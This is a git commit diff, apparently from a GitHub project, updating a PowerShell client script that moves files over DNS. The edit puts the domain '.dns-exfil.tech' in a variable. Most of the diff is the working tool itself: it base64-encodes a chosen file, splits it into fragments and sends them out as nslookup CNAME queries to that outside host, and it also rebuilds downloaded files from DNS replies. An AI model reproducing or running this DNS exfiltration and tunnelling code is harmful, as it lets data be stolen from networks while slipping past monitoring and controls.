9850fec31076c4514cb84e3a1163dc60d466bde1
Jikkou9 <72326079+Jikkou9@users.noreply.github.com>
2022-03-27 04:46:44 -0500

    Update UserScript.ps1

--- Client/UserScript.ps1
+++ Client/UserScript.ps1
@@ -1,4 +1,5 @@
 ﻿function Upload-DNSFile{
+    $domain = ".dns-exfil.tech"
     #Allow the user to specify the file they want to upload using explorer.exe interface 
     $openFile = New-Object System.Windows.Forms.OpenFileDialog
     $null = $openFile.ShowDialog()
@@ -18,7 +19,7 @@
     }
 
     #Create the DNS record to collect the key when starting file uploads 
-    $keyDNSRecord = "up.start." + $openFile.SafeFileName.Replace(".","-").Replace(" ","_") + ".dns-exfil.tech"
+    $keyDNSRecord = "up.start." + $openFile.SafeFileName.Replace(".","-").Replace(" ","_") + $domain
 
     #Collect the key from the NSlookup
     $key = nslookup -type=CNAME -timeout=10 $keyDNSRecord 2>$null  | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
@@ -43,7 +44,7 @@
         $substringLength = If (($i + 60) -gt $base64File.length) {$base64File.length - $i} Else {60}
 
         #Create the DNS record to upload the current fragment of the base64file string
-        $DNSUploadRecord = ("up.send." + $key + "." + $count + "." + $base64File.Substring($i, $substringLength) + ".dns-exfil.tech")
+        $DNSUploadRecord = ("up.send." + $key + "." + $count + "." + $base64File.Substring($i, $substringLength) + $domain)
 
         #Upload the current fragment of the base64file string and verify no errors occured
         $DNSSend = nslookup -type=CNAME $DNSUploadRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
@@ -59,7 +60,7 @@
     }
 
     #Send a DNS request to signify the end of file upload
-    $DNSEnd = nslookup -type=CNAME ("up.end."+ $key +".dns-exfil.tech")  2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
+    $DNSEnd = nslookup -type=CNAME ("up.end."+ $key + $domain)  2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
     If (($DNSEnd -eq "ERROR") -or ($DNSEnd -eq $null)) {
         write-host "ERROR: Unable to end transmission, please try again."
         return 
@@ -71,11 +72,12 @@
 }
 
 function Download-DNSFile {
+    $domain = ".dns-exfil.tech"
     #Prompt the user for an application name
     $applicationName = read-host -Prompt "Enter application name: "
 
     #Create the DNS record to request the number of fragments 
-    $DNSApplicationNameRecord = "dn.info." + $applicationName + ".dns-exfil.tech"
+    $DNSApplicationNameRecord = "dn.info." + $applicationName + $domain
     
     #Collect the number of fragments required to download the file
     $fragmentCount = nslookup -type=CNAME -timeout=10 $DNSApplicationNameRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
@@ -84,6 +86,7 @@ function Download-DNSFile {
         return 
     } Elseif ($fragmentCount -eq "DNE"){ 
         write-host "ERROR:" $applicationName "does not exist"
+        return
     } Else {
         write-host "size: OK" $fragmentCount 
     } 
@@ -92,7 +95,7 @@ function Download-DNSFile {
     $downloadStringBase64 = $null
     for( $i = 0; $i -lt $fragmentCount; $i++ ){
         #Create the DNS record for the current fragment
-        $downloadDNSRecord = "dn.get." + $applicationName + "." + $i + ".dns-exfil.tech"
+        $downloadDNSRecord = "dn.get." + $applicationName + "." + $i + $domain
 
         #Use the downloadDNSRecord to download the current fragment and append it to the download string
         $downloadStringBase64 += nslookup -type=CNAME -timeout=10 $downloadDNSRecord 2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
